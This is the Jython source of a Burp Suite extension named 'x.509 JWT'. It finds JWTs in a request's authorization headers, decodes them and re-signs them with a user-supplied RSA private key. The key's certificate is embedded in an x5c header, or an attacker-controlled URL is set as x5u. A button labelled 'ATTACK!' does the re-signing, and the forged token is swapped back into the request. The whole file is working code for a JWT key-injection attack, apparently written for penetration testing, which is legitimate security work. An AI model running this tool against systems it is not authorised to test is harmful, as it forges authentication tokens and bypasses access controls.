from burp import IBurpExtender, ITab, IMessageEditorTab, IMessageEditorTabFactory
#import sys
import base64
import json
from javax.swing import JPanel, JLabel, JTextField, JButton, JFileChooser, JTextArea, JScrollPane, JComboBox
from java.awt import GridBagLayout, GridBagConstraints, Insets, BorderLayout, Dimension
from java.security import KeyFactory, Signature
from java.security.spec import PKCS8EncodedKeySpec
from java.util import Base64 as JavaBase64


class BurpExtender(IBurpExtender, ITab, IMessageEditorTabFactory):
    def getTabCaption(self):
        return "x.509 JWT"

    def getUiComponent(self):
        return self.scrollPane
    
    def createNewInstance(self, controller, editable):
        return RequestEditorTab(self, controller, editable)
    
    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("x.509 JWT")
        # create message editor in each request
        self.callbacks.registerMessageEditorTabFactory(self)

    
class RequestEditorTab(IMessageEditorTab):
    def __init__(self, extender, controller, editable):

        #self.editor = extender.callbacks.createTextEditor()
        self.extender = extender
        self.callbacks = extender.callbacks
        self.helpers = extender.helpers

        self.panel = JPanel(GridBagLayout())
        self.scrollPane = JScrollPane(self.panel)
        self.scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)
        self.scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED)

        # Row counter for layout management
        row = 0

        # JWT Input
        self.add_JWT_Input("JWT Input:", row)
        row += 1
        self.add_Decoded_JWT("Decoded JWT:", row)
        row +=1
        self.add_Field_and_Label("Private Key:", row)
        row += 1
        self.add_Field_and_Label("Certificate:", row)
        row += 1
        self.add_x5u_field("x5u URL:", row)
        row += 1
        self.add_Resign_Option("Re-sign JWT with:", row)
        row += 1
        self.add_Signed_JWT("Re-Signed Token", row)
    

    def getUiComponent(self):
        #return self.editor.getComponent()
        return self.scrollPane

    def getTabCaption(self):
        return "Re-sign JWT"
    
    # Decide when the editor tab should appear in a request
    def isEnabled(self, content, isRequest):
        self.content = content
        if isRequest == True:
            if self.containsJWT(content):
                return True
        return False

    # does the request contain one of the headers for a JWT?
    def containsJWT(self, content):
        Header_List = ["authorization:", "x-auth-token:" ]
        request = self.extender.helpers.analyzeRequest(content)
        headers = request.getHeaders()
        for header in headers[1:]:
            # always grab the last value from the split. This accounts for headers that may include "bearer or not"
            value = header.split(" ")[-1]
            name = header.split(" ")[0]
            # Only set the JWT input if its an auth header
            if name.lower() in Header_List and self.is_JWT(value):
                self.JWT_Input.setText(value)
                return header
        return False
    
    def is_JWT(self, token):
        #Try to split the token
        try:
            value = token.split(".")
            # if there aren't 3 parts, it isn't a valid JWT
            if len(value) !=3:
                return False
            # attempt to decode header and payload. If you make it past this, it's likely a JWT.
            json.loads(base64.b64decode(value[0] + "==").decode())
            json.loads(base64.b64decode(value[1] + "==").decode())
            return True
        # If at any point an error occurs, token is likely not a jwt.
        except Exception:
            return False
        
    # Just Make Burp Happy with this    
    def isModified(self):
        if self.JWT_Output.getText():
            return True

    def add_JWT_Input(self, label, row):
        # Create a panel to hold the label and text area
        container = JPanel(BorderLayout())
        
        # Create label and text area
        label = JLabel(label)
        self.JWT_Input = JTextArea()
        self.JWT_Input.setLineWrap(True)
        self.JWT_Input.setWrapStyleWord(True)

        # Wrap the text area in a scroll pane
        scroll_pane = JScrollPane(self.JWT_Input)
        scroll_pane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)

        # Ensure the scroll pane's preferred size is set
        scroll_pane.setPreferredSize(Dimension(1000, 150))  # Adjust the size based on your layout needs

        # Add the label to the top of the container and the scroll pane to the center
        container.add(label, BorderLayout.NORTH)
        container.add(scroll_pane, BorderLayout.CENTER)
        self.add_decode_button(container, row)

        # Add the container to the main panel with proper layout constraints
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)
    
    def add_Signed_JWT(self, label, row):
        # Create a panel to hold the label and text area
        container = JPanel(BorderLayout())
        
        # Create label and text area
        label = JLabel(label)
        self.JWT_Output = JTextArea()
        self.JWT_Output.setLineWrap(True)
        self.JWT_Output.setWrapStyleWord(True)

        # Wrap the text area in a scroll pane
        scroll_pane = JScrollPane(self.JWT_Output)
        scroll_pane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)

        # Ensure the scroll pane's preferred size is set
        scroll_pane.setPreferredSize(Dimension(1000, 150))  # Adjust the size based on your layout needs

        # Add the label to the top of the container and the scroll pane to the center
        container.add(label, BorderLayout.NORTH)
        container.add(scroll_pane, BorderLayout.CENTER)

        # Add the container to the main panel with proper layout constraints
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)

    def add_decode_button(self, container, row):
        # Create a Decode button with a smaller width
        button = JButton("Decode")
        button.setPreferredSize(Dimension(150, 25))  # Set the width to 150, smaller than the text area
        button.addActionListener(self.decode_clicked)

        # Create a new panel for the button to center it
        button_panel = JPanel()
        button_panel.add(button)  # Add the button to the new panel

        # Add the button panel to the south of the container
        container.add(button_panel, BorderLayout.SOUTH)

        # Add the container to the main panel with proper layout constraints
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)

    def decode_clicked(self, event):
        #Split the JWT, assign the parts to associated variable
        headers, payload, signature = self.JWT_Input.getText().strip().split(".")

        #Make the decoded values globally so it can be used for generating a new JWT
        decoded_headers = base64.b64decode(headers + '=' * (len(headers) %4))
        decoded_payload = base64.b64decode(payload + '=' * (len(payload) %4))
        self.decoded_jwt_headers.setText(decoded_headers)
        self.decoded_jwt_payload.setText(decoded_payload)
    
    def add_Decoded_JWT(self, label, row):
        # Create a panel to hold the label and text area
        container = JPanel(BorderLayout())
        
        # Create label and text area for JWT headers
        label = JLabel(label)
        self.decoded_jwt_headers = JTextArea()
        self.decoded_jwt_headers.setLineWrap(True)
        self.decoded_jwt_headers.setWrapStyleWord(True)

        # Wrap the text area in a scroll pane
        scroll_pane_headers = JScrollPane(self.decoded_jwt_headers)
        scroll_pane_headers.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)
        scroll_pane_headers.setPreferredSize(Dimension(1000, 50))

        #Create text area for JWT payload
        self.decoded_jwt_payload = JTextArea()
        self.decoded_jwt_payload.setLineWrap(True)
        self.decoded_jwt_payload.setWrapStyleWord(True)

        # Wrap the text area in a scroll pane
        scroll_pane_payload = JScrollPane(self.decoded_jwt_payload)
        scroll_pane_payload.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)
        scroll_pane_payload.setPreferredSize(Dimension(1000, 50))

        # Add the label to the top of the container and the scroll pane to the center
        container.add(label, BorderLayout.NORTH)
        container.add(scroll_pane_headers, BorderLayout.CENTER)
        container.add(scroll_pane_payload,BorderLayout.SOUTH)

        # Add the container to the main panel with proper layout constraints
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)

    def add_Field_and_Label(self, label, row):
        container = JPanel(BorderLayout())
        label = JLabel(label)

        if label.getText() == "Private Key:":
            self.private_key = JTextField()
            self.private_key.setEditable(False)
            scroll_pane = JScrollPane(self.private_key)
            scroll_pane.setPreferredSize(Dimension(500, 30))

            #Add Import Button
            button = JButton("import")
            button.addActionListener(lambda event: self.import_File(label))
            container.add(label, BorderLayout.NORTH)
            container.add(scroll_pane, BorderLayout.WEST)
            container.add(button, BorderLayout.EAST)

        elif label.getText() == "Certificate:":
            self.certificate = JTextField()
            self.certificate.setEditable(False)
            scroll_pane = JScrollPane(self.certificate)
            scroll_pane.setPreferredSize(Dimension(500, 30))

            #Add Import Button
            button = JButton("import")
            button.addActionListener(lambda event: self.import_File(label))
            container.add(label, BorderLayout.NORTH)
            container.add(scroll_pane, BorderLayout.WEST)
            container.add(button, BorderLayout.EAST)
        
        # Add the container to the main panel with proper layout constraints
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, -425, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)

    def import_File(self, label):
        #Add what to do when "import" is clicked
        file_chooser = JFileChooser()
        result = file_chooser.showOpenDialog(self.panel)
        if result == JFileChooser.APPROVE_OPTION:
            file = file_chooser.getSelectedFile()
            if label.getText() == "Private Key:":
                self.private_key.setText(file.getAbsolutePath())
            elif label.getText() == "Certificate:":
                self.certificate.setText(file.getAbsolutePath())
            else:
                print("No proper label text")
    
    def add_Resign_Option(self, label, row):
        container = JPanel(BorderLayout())

        label = JLabel(label)
        self.resign_option = JComboBox(["x5c Header", "x5u Header"])

        button = JButton("ATTACK!")
        button.addActionListener(self.resign_JWT)

        container.add(label, BorderLayout.NORTH)
        container.add(self.resign_option, BorderLayout.CENTER)
        container.add(button, BorderLayout.EAST)

        gbc = GridBagConstraints()
        gbc.insets = Insets(5, -800, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)

    def add_x5u_field(self, label, row):
        #add input field
        container = JPanel(BorderLayout())
        label = JLabel(label)
        self.x5u_URL = JTextField()
        self.x5u_URL.setEditable(True)
        scroll_pane = JScrollPane(self.x5u_URL)
        scroll_pane.setPreferredSize(Dimension(500, 30))

        container.add(label, BorderLayout.NORTH)
        container.add(scroll_pane, BorderLayout.CENTER)

        # Add the container to the main panel with proper layout constraints
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, -500, 5, 5)
        gbc.gridx = 0
        gbc.gridy = row
        gbc.weightx = 1.0
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.NONE  # Avoid stretching
        gbc.anchor = GridBagConstraints.NORTH
        self.panel.add(container, gbc)

    def resign_JWT(self, event):
        json_headers = json.loads(self.decoded_jwt_headers.getText())
        json_payload = json.loads(self.decoded_jwt_payload.getText())
        try:
            if self.resign_option.getSelectedItem() == "x5u Header":
                #gen x5u JWT
                json_headers["x5u"] = self.x5u_URL.getText()

            elif self.resign_option.getSelectedItem() == "x5c Header":
                #Read certificate (public key) and embed in x5c header
                with open(self.certificate.getText(), 'r') as certificate:
                    cert_data = certificate.readlines()

                # Remove PEM headers
                cert_data = ''.join(line.strip() for line in cert_data if not line.startswith("-----"))
                #Parse the certificate (public key) and overwrite/add x5c header
                #json_headers["x5c"] = [base64.b64encode(cert_data.encode('utf-8')).decode('utf-8')]
                json_headers["x5c"] = [cert_data]

            else:
                #Do some error handling
                print("Was a re-signing option chosen?")

            jwt = self.generate_jwt(json_headers, json_payload)
            self.JWT_Output.setText(jwt)

        except IOError:
            print("No private key, public key, or URL provided")

    def generate_jwt(self, json_headers, json_payload):
            #Read private key
            key_builder = []
            with open(self.private_key.getText(), 'r') as key_file:
                for line in key_file:
                    if not line.startswith("-----"):
                        key_builder.append(line.strip())
            key_bytes = JavaBase64.getDecoder().decode(''.join(key_builder))
            key_spec = PKCS8EncodedKeySpec(key_bytes)
            key_factory = KeyFactory.getInstance("RSA")
            key_factory.generatePrivate(key_spec)
            
            # convert header and payload values to strings
            header_string = json.dumps(json_headers)
            payload_string = json.dumps(json_payload)

            # Base64 encode header and payload. Append with a "." between. 
            header_encoded = JavaBase64.getUrlEncoder().withoutPadding().encodeToString(header_string)
            payload_encoded = JavaBase64.getUrlEncoder().withoutPadding().encodeToString(payload_string)
            signing_input = header_encoded + "." + payload_encoded

            # Generate signature based on privatekey provided. 
            signature = Signature.getInstance("SHA256withRSA")
            signature.initSign(key_factory.generatePrivate(key_spec))
            signature.update(signing_input)
            jwt_signature = JavaBase64.getUrlEncoder().withoutPadding().encodeToString(signature.sign())

            # Return the full JWT
            return signing_input + "." + jwt_signature

    def setMessage(self, content, isRequest):
        if isRequest:
            self.currentMessage = content
        return
    
    # Everytime you switch between tabs, this method will run.
    def getMessage(self):
        if self.JWT_Output.getText() != "":
            Header_List = ["authorization:", "x-auth-token:" ]
            request = self.extender.helpers.analyzeRequest(self.currentMessage)
            requestString = self.callbacks.getHelpers().bytesToString(self.currentMessage)
            headers = request.getHeaders()
            body = requestString[request.getBodyOffset():]
            for i in range(1, len(headers)):
                # always grab the last value from the split. This accounts for headers that may include "bearer or not"
                parts = headers[i].split()
                value = parts[-1]
                name = parts[0]
                # check if the name of the header matches an expected value. and the last part of the header is a JWT
                if name.lower() in Header_List and self.is_JWT(value):
                    # Overwrite the header value with re-signed JWT
                    parts[-1] = self.JWT_Output.getText()
                    headers[i] = " ".join(parts)
            return self.helpers.buildHttpMessage(headers, body)